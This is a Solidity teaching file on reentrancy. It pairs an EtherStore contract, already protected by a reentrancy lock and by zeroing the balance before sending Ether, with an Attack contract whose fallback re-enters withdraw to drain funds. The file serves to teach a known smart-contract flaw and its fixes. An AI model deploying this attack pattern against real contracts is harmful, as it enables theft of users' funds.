// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Reentrancy

- What is reentrancy?
- Remix code and demo
- Preventative techniques
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public noReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0);
        
        balances[msg.sender] = 0;
        
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        //balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}